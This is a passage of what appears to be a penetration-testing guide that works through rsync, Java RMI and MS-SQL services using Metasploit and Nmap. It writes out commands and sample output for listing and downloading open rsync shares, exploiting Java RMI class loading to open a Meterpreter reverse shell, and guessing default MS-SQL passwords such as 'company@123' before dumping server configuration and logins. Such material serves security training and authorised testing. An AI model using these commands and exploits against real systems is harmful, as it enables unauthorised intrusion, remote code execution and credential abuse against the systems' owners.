</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/rsync/modules_list
</span><span class='line'>services -p 873 -u -S rsync -R</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 10.10.xx.xx:873 - 5 rsync modules found: OTG DATA, Server IMP Backup, Rajan Data, test, testing
</span><span class='line'>[*] Scanned 1 of 4 hosts (25% complete)
</span><span class='line'>[*] 10.10.xx.xx:873 - no rsync modules found
</span><span class='line'>[*] Scanned 2 of 4 hosts (50% complete)
</span><span class='line'>[*] Scanned 3 of 4 hosts (75% complete)
</span><span class='line'>[*] Scanned 4 of 4 hosts (100% complete)
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>
</li>

<strong>Nmap</strong> has 

<ol>
<li> <a href="https://nmap.org/nsedoc/scripts/rsync-list-modules.html">rsync-list-modules.nse</a> : Lists modules available for rsync (remote file sync) synchronization.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 873 XX.XX.XX.52 --script=rsync-list-modules
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-05-06 00:05 IST
</span><span class='line'>Nmap scan report for XX.XX.243.52
</span><span class='line'>Host is up (0.0088s latency).
</span><span class='line'>PORT    STATE SERVICE
</span><span class='line'>873/tcp open  rsync
</span><span class='line'>| rsync-list-modules: 
</span><span class='line'>|   mail              
</span><span class='line'>|   varlib            
</span><span class='line'>|   etc               
</span><span class='line'>|   net               
</span><span class='line'>|   dar               
</span><span class='line'>|   usrlocal          
</span><span class='line'>|   varlog            
</span><span class='line'>|   var               
</span><span class='line'>|_  root              
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 0.79 seconds</span></code></pre></td></tr></table></div></figure>
</li>
</ol>

How to test your rsync setup:
<ol>
<li> List the available shares by running ( may require a password )
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rsync rsync://share@your-ip-or-hostname/</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rsync rsync://etc@XX.XX.XX.52
</span><span class='line'>mail              
</span><span class='line'>varlib            
</span><span class='line'>etc               
</span><span class='line'>net               
</span><span class='line'>dar               
</span><span class='line'>usrlocal          
</span><span class='line'>varlog            
</span><span class='line'>var               
</span><span class='line'>root              </span></code></pre></td></tr></table></div></figure>

<li>After entering your password, rsync should now give a file listing
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rsync rsync://pub@your-ip-or-hostname/pub/</span></code></pre></td></tr></table></div></figure>
We may get access denied because of the IP address restrictions
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rsync rsync://etc@XX.XX.XX.52/mail
</span><span class='line'>@ERROR: access denied to mail from unknown (XX.4.XX.XX)
</span><span class='line'>rsync error: error starting client-server protocol (code 5) at main.c(1653) [Receiver=3.1.1]</span></code></pre></td></tr></table></div></figure>
</li>

<li>Run: 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rsync -v --progress --partial rsync://pub@your-ip-or-hostname/pub/someFile </span></code></pre></td></tr></table></div></figure> (you can abbreviate --partial --progress as -P). Your file should now be downloading.
<li>Run:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rsync -aPv rsync://pub@your-ip-or-hostname/pub/someDirectory .</span></code></pre></td></tr></table></div></figure>. Your directory should now be downloading
</ol>
</ol>


<h3>Java RMI | Port 1099</h3>

<p><strong>Metasploit</strong> has</p>

<ol>
<li><strong>Java RMI Server Insecure Endpoint Code Execution Scanner</strong>: detects RMI endpoints:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/misc/java_rmi_server
</span><span class='line'>services -u -p 1099 -S Java -R</span></code></pre></td></tr></table></div></figure>
Failed output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] 172.30.xx.xx:1099 Java RMI Endpoint Detected: Class Loader Disabled</span></code></pre></td></tr></table></div></figure>
Successful output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 192.168.xx.xx:1099 Java RMI Endpoint Detected: Class Loader Enabled</span></code></pre></td></tr></table></div></figure>
</li>
and then use
<li><strong>Java RMI Server Insecure Default Configuration Java Code Execution</strong>: This module takes advantage of the default configuration of the RMI Registry and RMI Activation services, which allow loading classes from any remote (HTTP) URL. As it invokes a method in the RMI Distributed Garbage Collector which is available via every RMI endpoint, it can be used against both rmiregistry and rmid, and against most other (custom) RMI endpoints as well. Note that it does not work against Java Management Extension (JMX) ports since those do not support remote class loading, unless another RMI endpoint is active in the same Java process. RMI method calls do not support or require any sort of authentication

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use exploit/multi/misc/java_rmi_server</span></code></pre></td></tr></table></div></figure>

Sample Output
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use exploit/multi/misc/java_rmi_server 
</span><span class='line'>msf exploit(java_rmi_server) &gt; set rhost 192.168.xx.xx
</span><span class='line'>rhost =&gt; 192.168.xx.xx
</span><span class='line'>msf exploit(java_rmi_server) &gt; run 
</span><span class='line'>
</span><span class='line'>[*] Started reverse TCP handler on 192.168.xx.xx:4444 
</span><span class='line'>[*] Using URL: http://0.0.xx.xx:8080/LAWVrAFTItH7N
</span><span class='line'>[*] Local IP: http://192.168.xx.xx:8080/LAWVrAFTItH7N
</span><span class='line'>[*] Server started.
</span><span class='line'>[*] 192.168.xx.xx:1099 - Sending RMI Header...
</span><span class='line'>[*] 192.168.xx.xx:1099 - Sending RMI Call...
</span><span class='line'>[*] 192.168.xx.xx     java_rmi_server - Replied to request for payload JAR
</span><span class='line'>[*] Sending stage (45741 bytes) to 192.168.xx.xx
</span><span class='line'>[*] Meterpreter session 1 opened (192.168.xx.xx:4444 -&gt; 192.168.7.87:3899) at 2016-05-03 18:24:53 +0530
</span><span class='line'>[-] Exploit failed: RuntimeError Timeout HTTPDELAY expired and the HTTP Server didn't get a payload request
</span><span class='line'>[*] Server stopped.</span></code></pre></td></tr></table></div></figure>

Here's a video of Mubix exploiting it from  Metasploit Minute <a href="https://hak5.org/episodes/metasploit-minute/exploitation-using-java-rmi-service-metasploit-minute">Exploitation using java rmi service</a>
</li>
</ol>


<p><strong>Nmap</strong> has</p>

<ol>
<li><a href="https://nmap.org/nsedoc/scripts/rmi-vuln-classloader.html">rmi-vuln-classloader.nse</a> Tests whether Java rmiregistry allows class loading. The default configuration of rmiregistry allows loading classes from remote URLs, which can lead to remote code execution. The vendor (Oracle/Sun) classifies this as a design feature.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap --script=rmi-vuln-classloader -p 1099 192.168.xx.xx
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-05-04 00:04 IST
</span><span class='line'>Nmap scan report for 192.168.xx.xx
</span><span class='line'>Host is up (0.0011s latency).
</span><span class='line'>PORT     STATE SERVICE
</span><span class='line'>1099/tcp open  rmiregistry
</span><span class='line'>| rmi-vuln-classloader: 
</span><span class='line'>|   VULNERABLE:
</span><span class='line'>|   RMI registry default configuration remote code execution vulnerability
</span><span class='line'>|     State: VULNERABLE
</span><span class='line'>|       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code executeion.
</span><span class='line'>|       
</span><span class='line'>|     References:
</span><span class='line'>|_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds
</span></code></pre></td></tr></table></div></figure></li>
</ol>


<h3>MS-SQL | Port 1433</h3>

<p><strong>MS-SQL</strong> is really vast multiple <strong>metasploit</strong> modules and blogs existing on the internet, Let&rsquo;s check <strong>Metasploit Modules</strong> one by one.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   auxiliary/admin/mssql/mssql_enum                                           normal     Microsoft SQL Server Configuration Enumerator
</span><span class='line'>   auxiliary/admin/mssql/mssql_enum_domain_accounts                           normal     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
</span><span class='line'>   auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                      normal     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
</span><span class='line'>   auxiliary/admin/mssql/mssql_enum_sql_logins                                normal     Microsoft SQL Server SUSER_SNAME SQL Logins Enumeration
</span><span class='line'>   auxiliary/admin/mssql/mssql_escalate_dbowner                               normal     Microsoft SQL Server Escalate Db_Owner
</span><span class='line'>   auxiliary/admin/mssql/mssql_escalate_dbowner_sqli                          normal     Microsoft SQL Server SQLi Escalate Db_Owner
</span><span class='line'>   auxiliary/admin/mssql/mssql_escalate_execute_as                            normal     Microsoft SQL Server Escalate EXECUTE AS
</span><span class='line'>   auxiliary/admin/mssql/mssql_escalate_execute_as_sqli                       normal     Microsoft SQL Server SQLi Escalate Execute AS
</span><span class='line'>   auxiliary/admin/mssql/mssql_exec                                           normal     Microsoft SQL Server xp_cmdshell Command Execution
</span><span class='line'>   auxiliary/admin/mssql/mssql_findandsampledata                              normal     Microsoft SQL Server Find and Sample Data
</span><span class='line'>   auxiliary/admin/mssql/mssql_idf                                            normal     Microsoft SQL Server Interesting Data Finder
</span><span class='line'>   auxiliary/admin/mssql/mssql_ntlm_stealer                                   normal     Microsoft SQL Server NTLM Stealer
</span><span class='line'>   auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                              normal     Microsoft SQL Server SQLi NTLM Stealer
</span><span class='line'>   auxiliary/admin/mssql/mssql_sql                                            normal     Microsoft SQL Server Generic Query
</span><span class='line'>   auxiliary/admin/mssql/mssql_sql_file                                       normal     Microsoft SQL Server Generic Query from File
</span><span class='line'>   auxiliary/analyze/jtr_mssql_fast                                           normal     John the Ripper MS SQL Password Cracker (Fast Mode)
</span><span class='line'>   auxiliary/gather/lansweeper_collector                                      normal     Lansweeper Credential Collector
</span><span class='line'>   auxiliary/scanner/mssql/mssql_hashdump                                     normal     MSSQL Password Hashdump
</span><span class='line'>   auxiliary/scanner/mssql/mssql_login                                        normal     MSSQL Login Utility
</span><span class='line'>   auxiliary/scanner/mssql/mssql_ping                                         normal     MSSQL Ping Utility
</span><span class='line'>   auxiliary/scanner/mssql/mssql_schemadump                                   normal     MSSQL Schema Dump</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s take</p>

<ol>
<li>
<strong>MSSQL Ping Utility</strong> which queries the MSSQL instance for information. This will also provide if any ms-sql is running on different ports. 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/mssql/mssql_ping
</span><span class='line'>services -p 1433 -R</span></code></pre></td></tr></table></div></figure>
Sample output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] SQL Server information for 10.10.xx.xx:
</span><span class='line'>[+]    ServerName      = SAPBWBI
</span><span class='line'>[+]    InstanceName    = BOE140
</span><span class='line'>[+]    IsClustered     = No
</span><span class='line'>[+]    Version         = 10.0.xx.xx
</span><span class='line'>[+]    tcp             = 50623
</span><span class='line'>[+]    np              = \\SAPBWBI\pipe\MSSQL$BOE140\sql\query
</span><span class='line'>[*] SQL Server information for 10.10.xx.xx:
</span><span class='line'>[+]    ServerName      = MANGOOSE
</span><span class='line'>[+]    InstanceName    = MSSQLSERVER
</span><span class='line'>[+]    IsClustered     = No
</span><span class='line'>[+]    Version         = 11.0.xx.xx
</span><span class='line'>[+]    tcp             = 1433
</span><span class='line'>[*] SQL Server information for 10.10.xx.xx:
</span><span class='line'>[+]    ServerName      = MHE-DMP
</span><span class='line'>[+]    InstanceName    = MSSQLSERVER
</span><span class='line'>[+]    IsClustered     = No
</span><span class='line'>[+]    Version         = 11.0.xx.xx
</span><span class='line'>[+]    tcp             = 1433
</span><span class='line'>[*] SQL Server information for 10.10.xx.xx:
</span><span class='line'>[+]    ServerName      = MHE-DMP
</span><span class='line'>[+]    InstanceName    = MHE_DMP_LIVE
</span><span class='line'>[+]    IsClustered     = No
</span><span class='line'>[+]    Version         = 11.0.xx.xx
</span><span class='line'>[+]    tcp             = 53029</span></code></pre></td></tr></table></div></figure>
After discovering the ms-sql instances, we can check if their are any default passwords. 
</li>
<li>Let's use <strong>MSSQL Login Utility</strong> to find out if we have any default passwords. This module simply queries the MSSQL instance for a specific user/pass (default is sa with blank) we always find default passwords such as company@123 etc. Once in an engagement, out of 200 Ms-sql instance we found around 60 default passwords. ;)
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/mssql/mssql_login
</span><span class='line'>set Password company@123
</span><span class='line'>services -p 1433 -R</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] 10.10.xx.xx:1433 - MSSQL - Starting authentication scanner.
</span><span class='line'>[+] 10.10.xx.xx:1433 - LOGIN SUCCESSFUL: WORKSTATION\sa:company@123
</span><span class='line'>[-] 10.10.xx.xx:1433 MSSQL - LOGIN FAILED: WORKSTATION\sa:company@123 (Incorrect: )</span></code></pre></td></tr></table></div></figure>

Once, we have the credentials to the SQL Server we can use Microsoft SQL Server Configuration Enumerator by "Carlos Perez" 

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/admin/mssql/mssql_enum
</span><span class='line'>set rhost 10.10.xx.xx
</span><span class='line'>set password company@123</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] Running MS SQL Server Enumeration...
</span><span class='line'>[*] Version:
</span><span class='line'>[*]   Microsoft SQL Server 2012 - 11.0.xx.xx (X64) 
</span><span class='line'>[*]       Feb 10 2012 19:39:15 
</span><span class='line'>[*]       Copyright (c) Microsoft Corporation
</span><span class='line'>[*]       Enterprise Edition (64-bit) on Windows NT 6.1 &lt;X64&gt; (Build 7601: Service Pack 1)
</span><span class='line'>[*] Configuration Parameters:
</span><span class='line'>[*]   C2 Audit Mode is Not Enabled
</span><span class='line'>[*]   xp_cmdshell is Enabled
</span><span class='line'>[*]   remote access is Enabled
</span><span class='line'>[*]   allow updates is Not Enabled
</span><span class='line'>[*]   Database Mail XPs is Not Enabled
</span><span class='line'>[*]   Ole Automation Procedures are Not Enabled
</span><span class='line'>[*] Databases on the server:
</span><span class='line'>[*]   Database name:master
</span><span class='line'>[*]   Database Files for master:
</span><span class='line'>[*]       C:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\DATA\master.mdf
</span><span class='line'>[*]       C:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\DATA\mastlog.ldf
</span><span class='line'>[*]   Database name:tempdb
</span><span class='line'>[*]   Database Files for tempdb:
</span><span class='line'>[*]       D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Data\tempdb.mdf
</span><span class='line'>[*]       D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Data\templog.ldf
</span><span class='line'>[*]   Database name:model
</span><span class='line'>[*]   Database Files for model:
</span><span class='line'>[*]       C:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\DATA\model.mdf
</span><span class='line'>[*]       C:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\DATA\modellog.ldf
</span><span class='line'>[*]   Database name:msdb
</span><span class='line'>[*]   Database Files for msdb:
</span><span class='line'>[*]       C:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\DATA\MSDBData.mdf
</span><span class='line'>[*]       C:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\DATA\MSDBLog.ldf
</span><span class='line'>[*]   Database name:ReportServer
</span><span class='line'>[*]   Database Files for ReportServer:
</span><span class='line'>[*]       D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Data\ReportServer.mdf
</span><span class='line'>[*]       D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Data\ReportServer_log.ldf
</span><span class='line'>[*]   Database name:ReportServerTempDB
</span><span class='line'>[*]   Database Files for ReportServerTempDB:
</span><span class='line'>[*]       D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Data\ReportServerTempDB.mdf
</span><span class='line'>[*]       D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Data\ReportServerTempDB_log.ldf
</span><span class='line'>[*] System Logins on this Server:
</span><span class='line'>[*]   sa
</span><span class='line'>[*]   ##MS_SQLResourceSigningCertificate##
</span><span class='line'>[*]   ##MS_SQLReplicationSigningCertificate##
</span><span class='line'>[*]   ##MS_SQLAuthenticatorCertificate##
</span><span class='line'>[*]   ##MS_PolicySigningCertificate##
</span><span class='line'>[*]   ##MS_SmoExtendedSigningCertificate##
</span><span class='line'>[*]   ##MS_PolicyEventProcessingLogin##
</span><span class='line'>[*]   ##MS_PolicyTsqlExecutionLogin##
</span><span class='line'>[*]   ##MS_AgentSigningCertificate##
</span><span class='line'>[*]   EXAMPLE\Administrator
</span><span class='line'>[*]   OTH-EXAMPLE\altadmin
</span><span class='line'>[*]   NT SERVICE\SQLWriter
</span><span class='line'>[*]   NT SERVICE\Winmgmt
</span><span class='line'>[*]   NT Service\MSSQLSERVER
</span><span class='line'>[*]   NT AUTHORITY\SYSTEM
</span><span class='line'>[*]   NT SERVICE\SQLSERVERAGENT
</span><span class='line'>[*]   NT SERVICE\ReportServer
</span><span class='line'>[*] Disabled Accounts:
</span><span class='line'>[*]   ##MS_PolicyEventProcessingLogin##
</span><span class='line'>[*]   ##MS_PolicyTsqlExecutionLogin##
</span><span class='line'>[*] No Accounts Policy is set for:
</span><span class='line'>[*]   All System Accounts have the Windows Account Policy Applied to them.
</span><span class='line'>[*] Password Expiration is not checked for:
</span><span class='line'>[*]   sa
</span><span class='line'>[*]   ##MS_PolicyEventProcessingLogin##
</span><span class='line'>[*]   ##MS_PolicyTsqlExecutionLogin##
</span><span class='line'>[*] System Admin Logins on this Server:
</span><span class='line'>[*]   sa
</span><span class='line'>[*]   EXAMPLE\Administrator
</span><span class='line'>[*]   OTH-EXAMPLE\altadmin
</span><span class='line'>[*]   NT SERVICE\SQLWriter
</span><span class='line'>[*]   NT SERVICE\Winmgmt
</span><span class='line'>[*]   NT Service\MSSQLSERVER
</span><span class='line'>[*]   NT SERVICE\SQLSERVERAGENT
</span><span class='line'>[*] Windows Logins on this Server:
</span><span class='line'>[*]   EXAMPLE\Administrator
</span><span class='line'>[*]   OTH-EXAMPLE\altadmin
</span><span class='line'>[*]   NT SERVICE\SQLWriter
</span><span class='line'>[*]   NT SERVICE\Winmgmt
</span><span class='line'>[*]   NT Service\MSSQLSERVER
</span><span class='line'>[*]   NT AUTHORITY\SYSTEM
</span><span class='line'>[*]   NT SERVICE\SQLSERVERAGENT
</span><span class='line'>[*]   NT SERVICE\ReportServer
</span><span class='line'>[*] Windows Groups that can logins on this Server:
</span><span class='line'>[*]   No Windows Groups where found with permission to login to system.
</span><span class='line'>[*] Accounts with Username and Password being the same:
</span><span class='line'>[*]   No Account with its password being the same as its username was found.
</span><span class='line'>[*] Accounts with empty password:
</span><span class='line'>[*]   No Accounts with empty passwords where found.
</span><span class='line'>[*] Stored Procedures with Public Execute Permission found:
</span><span class='line'>[*]   sp_replsetsyncstatus
</span><span class='line'>[*]   sp_replcounters
</span><span class='line'>[*]   sp_replsendtoqueue
</span><span class='line'>[*]   sp_resyncexecutesql
</span><span class='line'>[*]   sp_prepexecrpc
</span><span class='line'>[*]   sp_repltrans
</span><span class='line'>[*]   sp_xml_preparedocument
</span><span class='line'>[*]   xp_qv
</span><span class='line'>[*]   xp_getnetname
</span><span class='line'>[*]   sp_releaseschemalock
</span><span class='line'>[*]   sp_refreshview
</span><span class='line'>[*]   sp_replcmds
</span><span class='line'>[*]   sp_unprepare
</span><span class='line'>[*]   sp_resyncprepare
</span><span class='line'>[*]   sp_createorphan
</span><span class='line'>[*]   xp_dirtree
</span><span class='line'>[*]   sp_replwritetovarbin
</span><span class='line'>[*]   sp_replsetoriginator
</span><span class='line'>[*]   sp_xml_removedocument
</span><span class='line'>[*]   sp_repldone
</span><span class='line'>[*]   sp_reset_connection
</span><span class='line'>[*]   xp_fileexist
</span><span class='line'>[*]   xp_fixeddrives
</span><span class='line'>[*]   sp_getschemalock
</span><span class='line'>[*]   sp_prepexec
</span><span class='line'>[*]   xp_revokelogin
</span><span class='line'>[*]   sp_resyncuniquetable
</span><span class='line'>[*]   sp_replflush
</span><span class='line'>[*]   sp_resyncexecute
</span><span class='line'>[*]   xp_grantlogin
</span><span class='line'>[*]   sp_droporphans
